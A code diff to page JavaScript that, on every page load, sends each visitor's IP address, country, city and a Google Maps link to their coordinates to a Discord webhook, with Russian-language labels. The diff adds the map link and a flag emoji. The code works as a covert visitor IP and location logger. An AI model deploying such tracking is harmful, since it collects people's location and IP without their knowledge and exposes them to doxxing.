@@ -10,7 +10,7 @@ async function sendToDiscord(webhookURL, content, embed) {
             },
             body: JSON.stringify({
                 content: content,
-                embeds: [embed],
+                embeds: embed ? [embed] : [],
             }),
         });
 
@@ -34,18 +34,28 @@ async function getGeoData() {
     }
 }
 
+function getCountryFlagEmoji(countryCode) {
+    return countryCode
+        .toUpperCase()
+        .replace(/./g, char => String.fromCodePoint(0x1f1e6 - 65 + char.charCodeAt()));
+}
+
 document.addEventListener('DOMContentLoaded', async () => {
     const geoData = await getGeoData();
     let description = "Новый пользователь зашел на сайт.";
 
-    if (geoData.country_name) {
-        description += `\nСтрана: ${geoData.country_name}`;
+    if (geoData.country_name && geoData.country_code) {
+        description += `\nСтрана: ${geoData.country_name} ${getCountryFlagEmoji(geoData.country_code)}`;
     }
     if (geoData.city) {
         description += `\nГород: ${geoData.city}`;
     }
     if (geoData.ip) {
         description += `\nIP: ${geoData.ip}`;
+    }
+    if (geoData.latitude && geoData.longitude) {
+        const locationUrl = `https://www.google.com/maps/search/?api=1&query=${geoData.latitude},${geoData.longitude}`;
+        description += `\n[Определенное местоположение](${locationUrl})`;
     }
     description += `\nВремя входа: ${new Date().toLocaleString()}`;
 
